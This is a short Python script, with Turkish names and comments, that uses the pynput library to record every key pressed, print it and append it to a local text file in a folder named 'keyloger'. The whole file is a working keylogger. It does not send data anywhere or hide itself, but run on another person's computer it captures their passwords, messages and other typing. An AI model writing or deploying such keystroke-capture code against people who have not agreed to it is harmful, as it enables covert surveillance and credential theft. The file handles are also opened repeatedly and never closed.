from pynput import keyboard

def tusaBasildiginda(tus):
    try:
        print("Basilan tus: {0}".format(tus.char))
        dosya = open("D:/Project/Python/keyloger/basilanTuslar.txt", "a", encoding="utf8")
        dosya.write(tus.char)
    except AttributeError:
        print("Basilan tus: {0}".format(tus))
        dosya = open("D:/Project/Python/keyloger/basilanTuslar.txt", "a", encoding="utf8")
        dosya.write("\n" + str(tus) + "\n")

def tusBirakıldığında(tus):
    # print("Birakilan tus: {0}".format(tus.char))
    pass

with keyboard.Listener(on_press=tusaBasildiginda, on_release=tusBirakıldığında) as dinleyici:
    dinleyici.join()